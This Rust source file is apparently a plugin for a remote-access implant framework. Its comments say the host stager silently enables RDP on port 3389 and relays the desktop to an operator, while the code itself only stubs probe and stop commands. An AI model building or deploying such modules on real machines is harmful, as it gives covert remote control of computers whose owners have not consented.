//! L2 `mod_desktop` — capability package for remote desktop (RDP port-forward).
//!
//! **Not in Stage0.** Operator stages this package (`desktop.bin`) from Module panel,
//! then opens 远程桌面. Stage0 registers it as a product worker (not mapped); on load,
//! Stage0 auto-enables local RDP (3389) — see `cupcake_core::rdp_enable`.
//! `desktop_bridge` then runs the Yamux DESKTOP (0x0D) relay while this module is Loaded.
//!
//! No GDI/JPEG capture — product path is agent-side dial to target:3389.

use std::sync::atomic::{AtomicBool, Ordering};

static READY: AtomicBool = AtomicBool::new(false);

#[no_mangle]
pub extern "C" fn mod_init() -> i32 {
    READY.store(true, Ordering::SeqCst);
    0
}

#[no_mangle]
pub unsafe extern "C" fn mod_invoke(
    cmd_type: *const u8,
    cmd_type_len: u32,
    _payload: *const u8,
    _payload_len: u32,
    out_ptr: *mut *mut u8,
    out_len: *mut u32,
) -> i32 {
    if out_ptr.is_null() || out_len.is_null() {
        return -1;
    }
    *out_ptr = std::ptr::null_mut();
    *out_len = 0;

    let ct = slice_str(cmd_type, cmd_type_len).unwrap_or("");
    match ct {
        "desktop_probe" | "probe" => {
            let body = serde_json::json!({
                "ok": true,
                "mode": "rdp",
                "default_target": "127.0.0.1",
                "default_port": 3389,
                "yamux": "DESKTOP/0x0D",
                "ready": READY.load(Ordering::SeqCst),
            })
            .to_string();
            write_out(out_ptr, out_len, body.as_bytes())
        }
        "desktop_stop" | "stop" => {
            // Relay sessions are owned by Stage0 bridge; stop is a no-op at module level.
            write_out(out_ptr, out_len, br#"{"ok":true}"#)
        }
        _ => write_out(
            out_ptr,
            out_len,
            format!(r#"{{"ok":false,"msg":"unsupported cmd_type '{ct}'"}}"#).as_bytes(),
        ),
    }
}

#[no_mangle]
pub unsafe extern "C" fn mod_free(ptr: *mut u8, len: u32) {
    if ptr.is_null() || len == 0 {
        return;
    }
    let _ = Vec::from_raw_parts(ptr, len as usize, len as usize);
}

#[no_mangle]
pub extern "C" fn mod_shutdown() -> i32 {
    READY.store(false, Ordering::SeqCst);
    0
}

fn slice_str(p: *const u8, len: u32) -> Option<&'static str> {
    if p.is_null() || len == 0 {
        return None;
    }
    let s = unsafe { std::slice::from_raw_parts(p, len as usize) };
    std::str::from_utf8(s).ok()
}

unsafe fn write_out(out_ptr: *mut *mut u8, out_len: *mut u32, bytes: &[u8]) -> i32 {
    let mut v = bytes.to_vec();
    let len = v.len() as u32;
    let p = v.as_mut_ptr();
    std::mem::forget(v);
    *out_ptr = p;
    *out_len = len;
    0
}
